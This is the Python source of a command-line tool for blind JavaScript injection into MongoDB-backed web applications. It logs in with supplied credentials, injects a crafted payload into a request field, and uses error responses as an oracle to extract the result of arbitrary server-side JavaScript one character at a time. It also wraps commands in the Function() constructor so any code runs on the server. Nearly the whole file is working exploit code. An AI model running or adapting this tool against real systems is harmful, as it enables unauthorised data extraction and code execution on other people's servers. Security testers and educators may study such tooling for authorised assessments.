import requests
import time
import sys
import json

import argparse, textwrap

PLACEHOLDER_USER = "admin"

### ARGPARSE

parser = argparse.ArgumentParser(description='CLI for JS injection into MongoDB', formatter_class=argparse.RawTextHelpFormatter)
                    
parser.add_argument('url',
                    metavar='url',
                    type=str,
                    help='ex: http://example.com/vulnerable/page')                    

parser.add_argument('--login',
                    type=str,
                    help=textwrap.dedent('''authenticate before doing anything\nex: login:password@http://example.com/login-page'''))
                    
parser.add_argument('--headers',
                    type=str,
                    help='JSON file containing HTTP headers')
                    
parser.add_argument('--template',
                    type=str,
                    help="""injection template\ndefault: admin' && {test} ? Math : throwerrorplease ||'""")

parser.add_argument('--field',
                    type=str,
                    help='parameter to inject to, default: username')
                    
parser.add_argument('--method',
                    type=str,
                    help='HTTP method, default: GET')
                    
parser.add_argument('--error',
                    type=str,
                    help='string for detecting when injected check returned false\ndefault: Internal Server Error')

args = parser.parse_args()

### COLORS

def error(text):
	print("\033[91m" + text + "\033[0m")


def warning(text):
	print("\033[93m" + text + "\033[0m")
	
	
def info(text):
	print("\033[96m" + text + "\033[0m")
	
	
def success(text):
	print("\033[92m" + text + "\033[0m")
	
###


def do_login(arg, headers):
	username = arg.split(":")[0]
	password = arg.split(":")[1].split("@")[0]
	url = arg.split("@")[1]
	
	# default to http://
	if (not url.startswith("http://")) and (not url.startswith("https://")):
		url = "http://" + url
		
	print(url)

	data = {
		"username": username, # change these to your needs
		"password": password
	}
	
	session = requests.Session()
	r = session.post(url, data=data, headers=headers, timeout=3)
	
	if r.url.split("?")[0] == url.split("?")[0]: # checks if we end up on the login page
		error("Login failed")
		exit()
	
	return session
	

def try_req(test, session, headers):
	field = "username"
	
	if args.field:
		field = args.field

	data = {
		field:f"""admin' && ({test} ? Math : throwerrorplease) ||'"""
	}
	
	if args.template:
		data[field] = args.template.replace("{test}", test)
	
	# default to http://
	if (not args.url.startswith("http://")) and (not args.url.startswith("https://")):
		args.url = "http://" + args.url
	
	try:
		if args.method == "POST":
			r = session.post(args.url, verify=False, headers=headers, data=data, timeout=2)
		else:
			r = session.get(args.url, verify=False, headers=headers, params=data, timeout=2)
	except requests.exceptions.Timeout:
		return False
	
	if "Bad Gateway" in r.text:
		return "try again"
	
	# check if BAD is in the reponse text
	BAD = "Internal Server Error"
	
	if args.error:
		BAD = args.error
	
	if BAD in r.text:
		return False
	
	return True


def output_payload(session, dec, cmd, c, output, headers):
	inj = None
	if chr(c) == '"':
		inj = '\\"'
	else:
		inj = chr(c)

	# inject code into Function() constructor to allow all code to be passed
	# .bind(this) to preserve this
	payload = '(Function("return (function(){' + dec + '; ' + cmd + '}).bind(this)()").call(this)).toString().startsWith("' + output + inj + '")'
		
	out = try_req(payload, session, headers)
			
	if out:
		return output + inj, True
	return output, False


def get_output(cmd, session, headers):
	output = ""
	
	# this function returns all methods and properties
	dec = "function getAll(e){var t=[],r=e;do{Object.getOwnPropertyNames(r).forEach((function(e){-1===t.indexOf(e)&&t.push(e)}))}while(r=Object.getPrototypeOf(r));return t}"
	
	last = ""
	while True:
		for c in reversed(range(32, 127)):
			output, res = output_payload(session, dec, cmd, c, output, headers)
			sys.stdout.write('\r\033[92m' + output + chr(c) + "\033[0m")
			if res:
				break
		for c in [9, 10, 22, 27, 32, 33, 34, 160, 255]:
			output, res = output_payload(session, dec, cmd, c, output, headers)
			if res:
				break	
		
		if last == output:
			print()
			break
		last = output
		

def cli(session, headers):
	while True:
		ask = input("> ")
		
		if ask == '':
			continue
		
		if ask[0] == ":":
			get_output(ask[1:], session, headers)
		else:
			r = try_req(ask, session, headers)
			if(r):
				success("Exists: " + str(r))
			else:
				warning("Exists: " + str(r))
		
def main():
	### HEADERS from JSON
	headers = {}
	if args.headers:
		try:
			f = open(args.headers, "r")
		except OSError as e:
			error("Failed to open --headers file")
			exit()
		headers = json.load(f)

	### LOGIN
	if args.login:
		if ":" not in args.login or "@" not in args.login:
			error("Wrong format: --url")
			warning("ex: login:password@http://example.com/login-page")
			exit()
	
		session = do_login(args.login, headers)
	else:
		session = requests.Session()
	
	info("MongoDB JS injection CLI")
	info("https://github.com/brun0ne/mongodb-js-injection-cli")
	warning(">> USAGE:")
	success("   <variable> to check if it exists")
	success("   :return <variable> to get .toString()")
	success("   :return getAll(<variable>) to get all children")
	warning(">> HOW TO CHECK IF IT WORKS:")
	success("   typing \033[1mthisforsuredoesnotexist\033[0m    should return False")
	success("   typing \033[1mthis\033[0m                       should return True")
	cli(session, headers)
	
	
if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		error("\nExiting...")
		exit()
